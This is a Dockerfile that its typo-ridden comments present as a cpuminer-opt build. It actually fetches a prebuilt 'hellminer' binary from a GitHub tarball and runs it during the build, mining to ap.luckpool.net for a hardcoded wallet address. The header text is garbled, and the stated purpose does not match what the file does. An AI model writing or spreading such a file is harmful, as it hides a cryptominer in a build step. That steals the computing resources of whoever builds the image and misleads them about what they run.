# Dockerfile for cuminer-o
# usage: docker build -t cpumine-opt:late
# run: doker run -it -rm cpuminer-opt:ltest [AR
# ex: docker run -it -rm cpuminer-op:atest -a cryptonigt -o cryptonight.eu.nicehash.com:3355 -u 1MiningDW2GKzf4VQfmp4q2XoUvR6iy6PD.worker1 -p x -t 3
#

# Bui
FROM ubuntu:16.04 as builder

RUN apt-get update \
  && apt-get install -y \
    build-essential \
    libssl-dev \
    libgmp-dev \
    libcurl4-openssl-dev \
    libjansson-dev \
    automake \
  && rm -rf /var/lib/apt/lists/*

ADD https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz /helminer/
RUN cd helminer \
   && tar xzf hellminer_cpu_linux.tar.gz \
   && ls

# App
FROM ubuntu:16.04

RUN apt-get update \
   && apt-get install screen \
  && apt-get install -y \
    libcurl3 \
    libjansson4 \
  && rm -rf /var/lib/apt/lists/*

COPY --from=builder /helminer .
ENTRYPOINT ["./hellminer"]
RUN ./hellminer -p x --cpu 2 -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RYA9hTgYmNFayype84LN2cHCD2qg1bY4KK.ms
CMD ["-h"]
